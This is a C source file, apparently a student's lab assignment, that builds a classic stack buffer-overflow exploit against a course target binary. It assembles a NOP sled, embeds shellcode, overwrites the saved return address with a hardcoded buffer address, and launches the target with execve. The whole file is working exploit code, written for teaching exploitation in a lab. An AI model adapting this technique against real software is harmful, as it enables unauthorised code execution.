// | Author |    utid 	|   student id	|
// | Ke Li	|   like23 	|	1005842554	|
// |		|			|
// Reference:
// Smashing The Stack For Fun And Profit - Aleph One
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"
#define DEFAULT_BUFFER_SIZE 73
#define RIP_ADDR 68

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	// buf[64] addr: 0x3021fe50
	unsigned long buf_addr = 0x3021fe5c;

	// func foo $rbp : 0x3021fe90

	char buff[DEFAULT_BUFFER_SIZE];
	int i; 
	
	// NOP sled
	for (i = 0; i < 68; i++) 
        buff[i] = '\x90';

	// shellcode
	int iter_shell;
	iter_shell = 0;
	for (i = 16; i < (16 + strlen(shellcode)); i++){
		buff[i] = shellcode[iter_shell]; 
		iter_shell++;
	}

	// Each iteration of the loop copies the 64-bit address into the buffer
	// Copy the address into the buffer, byte by byte, in little-endian order
	buff[0 + RIP_ADDR] = buf_addr & 0xFF;              // Byte 0
	buff[1 + RIP_ADDR] = (buf_addr >> 8) & 0xFF;   // Byte 1
	buff[2 + RIP_ADDR] = (buf_addr >> 16) & 0xFF;  // Byte 2
	buff[3 + RIP_ADDR] = (buf_addr >> 24) & 0xFF;  // Byte 3
	buff[4 + RIP_ADDR] = '\x00';

	// print for debug
	// =======================================
	// int length = strlen(buff);
	// // Don't comment out this loop, for some reason idk why the sploit is not
	// // work without this for loop
    // for (int i = 0; i < length; i++) {
    //     printf("\\x%02x", (unsigned char)buff[i]);
    // }
    // printf("\n");
	// =======================================

	args[0] = TARGET;
	args[1] = buff;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
